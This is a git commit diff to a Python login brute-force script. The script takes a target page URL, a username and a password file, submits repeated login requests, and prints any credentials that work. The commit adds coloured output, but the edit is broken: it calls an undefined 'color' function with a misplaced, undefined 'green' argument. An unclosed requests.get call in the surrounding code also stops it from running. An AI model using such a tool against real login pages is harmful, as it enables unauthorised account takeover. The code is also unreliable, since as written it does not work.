5b206ad46ce81d27189380cdbe811e0e716afff6
ericel7erek <ericalaa@ymail.com>
2024-09-28 21:33:20 -0400

    BruteForce/edited

--- BruteForce/bruteforce.py
+++ BruteForce/bruteforce.py
@@ -1,6 +1,7 @@
 import requests
+from termcolor import colored
 
-url = input('[+] Enter Page Url: ')
+url = input(color('[+] Enter Page Url: '),green)
 username = input('[+] Enter Username For The Account To BruteForce: ')
 password_file = input('[+] Enter The Password File To Use: ')
 login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
@@ -18,17 +19,18 @@ def cracking(username, url):
 		response = requests.post(url, data=data)
 		if cookie_value != '':
 			response = requests.get(url , params={
-                        'username': username,
-                        'password': password,
-                        'Login': 'Login'
+               	        'username': username,
+                       	'password': password,
+                       	'Login': 'Login'
                         }, cookies = {'Cookie': cookie_value}
 
 		if login_failed_string in response.content.decode():
 			pass
 		else:
-			print(f'[+] Found Username ==> {username}')
-			print(f'[+] Found Password ==> {password}')
+			print(color('[+] Found Username ==> ' + username), green)
+			print(color('[+] Found Password ==> ' + password), green)
 			exit()
+
 with open(password_file, 'r') as passwords:
 	cracking(username, url)
 
